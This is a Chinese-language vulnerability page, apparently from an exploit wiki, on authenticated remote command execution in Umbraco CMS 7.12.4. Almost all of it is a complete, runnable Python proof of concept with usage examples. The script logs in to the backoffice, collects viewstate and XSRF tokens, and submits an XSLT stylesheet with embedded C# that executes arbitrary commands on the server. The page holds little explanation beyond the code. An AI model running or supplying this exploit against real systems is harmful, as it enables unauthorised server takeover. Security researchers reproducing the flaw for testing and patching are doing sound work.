Umbraco CMS 7.12.4 后台远程命令执行漏洞
=======================================

一、漏洞简介
------------

二、漏洞影响
------------

Umbraco CMS 7.12.4

三、复现过程
------------

### Usage

    $ python exploit.py -h
    usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS]

    Umbraco authenticated RCE

    optional arguments:
      -h, --help                 show this help message and exit
      -u USER, --user USER       username / email
      -p PASS, --password PASS   password
      -i URL, --host URL         root URL
      -c CMD, --command CMD      command
      -a ARGS, --arguments ARGS  arguments

### Examples:

    $ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig
    $ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c powershell.exe -a '-NoProfile -Command ls'

### poc

    # Exploit Title: Umbraco CMS - Authenticated Remote Code Execution 
    # Date: 2020-03-28
    # Exploit Author: Alexandre ZANNI (noraj)
    # Based on: https://www.exploit-db.com/exploits/46153
    # Vendor Homepage: http://www.umbraco.com/
    # Software Link: https://our.umbraco.com/download/releases
    # Version: 7.12.4
    # Category: Webapps
    # Tested on: Windows IIS
    # Example: python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig

    import requests
    import re
    import argparse

    from bs4 import BeautifulSoup

    parser = argparse.ArgumentParser(prog='exploit.py',
        description='Umbraco authenticated RCE',
        formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))
    parser.add_argument('-u', '--user', metavar='USER', type=str,
        required=True, dest='user', help='username / email')
    parser.add_argument('-p', '--password', metavar='PASS', type=str,
        required=True, dest='password', help='password')
    parser.add_argument('-i', '--host', metavar='URL', type=str, required=True,
        dest='url', help='root URL')
    parser.add_argument('-c', '--command', metavar='CMD', type=str, required=True,
        dest='command', help='command')
    parser.add_argument('-a', '--arguments', metavar='ARGS', type=str, required=False,
        dest='arguments', help='arguments', default='')
    args = parser.parse_args()

    # Payload
    payload = """    <?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>    """ % (args.arguments, args.command)

    login = args.user
    password = args.password
    host = args.url

    # Process Login
    url_login = host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"
    loginfo = { "username": login, "password": password}
    s = requests.session()
    r2 = s.post(url_login,json=loginfo)

    # Go to vulnerable web page
    url_xslt = host + "/umbraco/developer/Xslt/xsltVisualize.aspx"
    r3 = s.get(url_xslt)

    soup = BeautifulSoup(r3.text, 'html.parser')
    VIEWSTATE = soup.find(id="__VIEWSTATE")['value']
    VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value']
    UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']
    headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}
    data = { "__EVENTTARGET": "", "__EVENTARGUMENT": "", "__VIEWSTATE": VIEWSTATE,
        "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
        "ctl00$body$xsltSelection": payload,
        "ctl00$body$contentPicker$ContentIdValue": "",
        "ctl00$body$visualizeDo": "Visualize+XSLT" }

    # Launch the attack
    r4 = s.post(url_xslt, data=data, headers=headers)
    # Filter output
    soup = BeautifulSoup(r4.text, 'html.parser')
    CMDOUTPUT = soup.find(id="result").getText()
    print(CMDOUTPUT)
